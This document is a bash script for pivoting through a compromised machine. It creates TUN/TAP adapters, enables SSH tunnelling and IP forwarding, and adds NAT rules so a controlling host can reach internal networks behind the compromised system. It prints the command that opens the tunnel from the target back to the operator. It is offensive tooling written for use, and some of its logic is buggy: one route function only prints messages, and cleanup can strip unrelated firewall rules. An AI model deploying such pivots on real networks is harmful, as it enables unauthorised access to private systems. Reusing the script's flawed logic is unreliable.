#!/bin/bash

# Function to display the help menu
show_help() {
  echo "Usage: sudo $0 [OPTIONS]"
  echo "Options:"
  echo "  -h, --help             Display this help menu"
  echo "  -s, --source           Set up the controlled system"
  echo "  -t, --target           Set up the compromised system"
  echo "  -r, --routes [route(s)] Add routes (required with -s or -t)"
  echo "  -at, --adapter-type    Choose adapter type (tap or tun)"
  echo "  -i, --interface        Specify the outgoing interface (default: eth0)"
  echo "  --cleanup [source|target]  Remove setup for controlled or compromised system"
  echo ""
  echo "Example usage:"
  echo "  To set up the controlled system with a single route using a TAP adapter:"
  echo "  sudo $0 -r 10.60.1.0/24 --adapter-type tap -s"
  echo ""
  echo "  To set up the compromised system with multiple routes (comma-separated):"
  echo "  sudo $0 -r 10.60.1.0/24,10.70.1.0/24 -t -i eth1"
  echo ""
  echo "  To set up the compromised system with routes from a file:"
  echo "  sudo $0 -r routes.txt -t -i eth1"
  echo ""
  echo "  To remove the setup on the controlled system:"
  echo "  sudo $0 --cleanup source"
  echo ""
  echo "  To remove the setup on the compromised system:"
  echo "  sudo $0 --cleanup target"
  echo ""
}

# Function to add routes
add_routes() {
  local routes=$1
  local device=$2
  local route
  IFS=',' read -ra route_array <<< "$routes"  # Split comma-separated routes
  for route in "${route_array[@]}"; do
    # Display a message for each route
    echo "[+] Adding route: $route via $device dev tun0"
  done
}

# Function to change SSH configuration on the controlled system
change_ssh_config_controlled() {
  # Modify /etc/ssh/sshd_config for the controlled system
  echo "PermitTunnel yes" >> /etc/ssh/sshd_config
  systemctl restart ssh
  echo "[+] Changed SSH configuration on the controlled system"
}

# Function to set up TUN/TAP adapter
setup_tun_tap() {
  local device=$1
  local ip_address=$2
  local adapter_type=$3
  # Set up TUN/TAP adapter and display a message
  if [[ "$adapter_type" == "tap" ]]; then
    mode="tap"
  else
    mode="tun"
  fi
  ip tuntap add dev "$device" mode "$mode" user root
  ip addr add "$ip_address" dev "$device"
  ip link set dev "$device" up
  echo "[+] Set up $mode adapter $device with IP address $ip_address"
}

# Function to set up the controlled system
setup_controlled_system() {
  # Implement controlled system setup steps
  setup_tun_tap tun1 10.10.255.2/30 "$adapter_type"
  sysctl -w net.ipv4.ip_forward=1
  echo "[+] Enabled IP forwarding"
  ip route add 10.10.255.1 via 10.10.255.2 dev tun1
  echo "[+] Added route for 10.10.255.1 via 10.10.255.2 dev tun1"
  IFS=',' read -ra route_array <<< "$routes"  # Split comma-separated routes
  for route in "${route_array[@]}"; do
    iptables -t nat -A POSTROUTING -d "$route" -o "$interface" -j MASQUERADE
    echo "[+] Set up NAT with output interface: $interface for route $route"
  done

  # Display additional messages
  echo "[!] To complete the setup for VPN connection, on the target host, run:"
  echo "[!] sudo $0 -r <route(s)> -t -i <outgoing interface>"
  echo "[!] To start the VPN connection, on the target host, run:"
  echo "[!] ssh -f -N -w 0:1 <ip>"
 
}

# Function to set up the compromised system
setup_compromised_system() {
  # Implement compromised system setup steps
  setup_tun_tap tun0 10.10.255.1/30 "$adapter_type"
  sysctl -w net.ipv4.ip_forward=1
  echo "[+] Enabled IP forwarding"
  ip route add 10.10.255.2 via 10.10.255.1 dev tun0
  echo "[+] Added route for 10.10.255.2 via 10.10.255.1 dev tun0"
  IFS=',' read -ra route_array <<< "$routes"  # Split comma-separated routes
  for route in "${route_array[@]}"; do
    iptables -t nat -A POSTROUTING -d "$route" -o "$interface" -j MASQUERADE
    echo "[+] Set up NAT with output interface: $interface for route $route"
  done
}

# Function to remove the setup on the controlled system
cleanup_controlled_system() {
  if [ -n "$routes" ]; then
    # Remove added route
    ip route del "$routes" via 10.10.255.2 dev tun1
  fi
  # Remove TUN/TAP adapter
  ip link del tun1
  # Restore SSH configuration
  sed -i '/PermitTunnel yes/d' /etc/ssh/sshd_config
  systemctl restart ssh
  echo "[+] Cleaned up the controlled system"
}

# Function to remove the setup on the compromised system
cleanup_compromised_system() {
  IFS=',' read -ra route_array <<< "$routes"  # Split comma-separated routes
  for route in "${route_array[@]}"; do
    iptables-save | grep -v "$route" | iptables-restore
    echo "[+] Removed NAT rule for route $route"
  done
  # Remove added route
  ip route del 10.10.255.2 via 10.10.255.1 dev tun0
  # Remove TUN/TAP adapter
  ip link del tun0
  echo "[+] Cleaned up the compromised system"
}

# Main script
if [ "$#" -eq 0 ]; then
  show_help
  exit 1
fi

if [[ $EUID -ne 0 ]]; then
  echo "This script must be run with sudo to create TUN/TAP adapters."
  exit 1
fi

routes=""
adapter_type="tap"  # Default adapter type
interface="eth0"    # Default outgoing interface

while [[ $# -gt 0 ]]; do
  case "$1" in
    -h | --help)
      show_help
      exit 0
      ;;
    -r | --routes)
      if [ -n "$2" ]; then
        if [ -f "$2" ]; then
          # Read routes from a file
          routes=$(cat "$2")
        else
          # Use provided routes
          routes="$2"
        fi
        shift
      else
        echo "[-] No routes specified. Use a valid route like '10.60.1.0/24' or a file containing routes."
        exit 1
      fi
      ;;
    -at | --adapter-type)
      if [ -n "$2" ]; then
        adapter_type="$2"
        shift
      else
        echo "[-] No adapter type specified. Please use 'tap' or 'tun'."
        exit 1
      fi
      ;;
    -i | --interface)
      if [ -n "$2" ]; then
        interface="$2"
        shift
      else
        echo "[-] No interface specified. Using default interface: eth0."
      fi
      ;;
    -s | --source)
      # Check if -r or --routes is provided
      if [ -z "$routes" ]; then
        echo "[-] The -s or --source option requires the -r or --routes option."
        show_help
        exit 1
      fi
      # Implement controlled system setup steps
      change_ssh_config_controlled
      setup_controlled_system
      ;;
    -t | --target)
      # Check if -r or --routes is provided
      if [ -z "$routes" ]; then
        echo "[-] The -t or --target option requires the -r or --routes option."
        show_help
        exit 1
      fi
      # Implement compromised system setup steps
      setup_compromised_system
      ;;
    --cleanup)
      if [ -n "$2" ]; then
        case "$2" in
          source)
            cleanup_controlled_system
            ;;
          target)
            cleanup_compromised_system
            ;;
          *)
            echo "Invalid argument for --cleanup. Use 'source' or 'target'."
            show_help
            exit 1
            ;;
        esac
        shift
      else
        echo "[-] No argument specified for --cleanup. Use 'source' or 'target'."
        exit 1
      fi
      ;;
    *)
      echo "Invalid option: $1"
      show_help
      exit 1
      ;;
  esac
  shift
done
